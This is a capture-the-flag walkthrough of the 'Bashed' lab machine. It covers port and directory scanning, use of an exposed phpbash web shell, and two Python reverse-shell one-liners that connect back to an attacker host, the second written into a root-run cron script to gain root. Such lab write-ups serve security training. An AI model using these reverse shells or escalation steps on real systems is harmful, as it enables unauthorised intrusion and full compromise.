# Bashed - Linux, easy (10.10.10.68)

### Nmap scan:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Obtaining User
The page at port 80 is a blog with one post that talks about **phpbash**.

So, let's first run gobuster to see how the site looks like:
```
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

An interesting result is the directory **/dev**, that contains file **phpbash.php**.
This is essentially a php bash shell that we can utilize to execute commands on the target.
At this point we can obtain the user flag even if we are user www-data.

### From User to Root
First, get a reverse shell by executing on the phpbash `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` and setting up a netcat listener.

With `sudo -l` we can notice that the user **scriptmanager** can run anything as user root, so we can essentially do what we want by just executing `sudo -u scriptmanager <command>`.
We can a shell as user scriptmanager with `sudo -u scriptmanage /bin/bash`.
This user has access to a folder caller **/scripts**:
```
scriptmanager@bashed:/scripts$ ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 17:03 test.py
-rw-r--r-- 1 root          root          12 Mar  7 04:09 test.txt
```

The python script simply prints somehing into the text file, which is owned by user root!
First, I tried to modify the string printed by test.py and after a few moment I noticed that the content of test.txt was changed, so the script is being executed (maybe with a cronjob?).

So, in order to get the shell as user root just overwrite test.py with a python reverse shell `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.2\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);`, and listen on your host with a netcat listener.

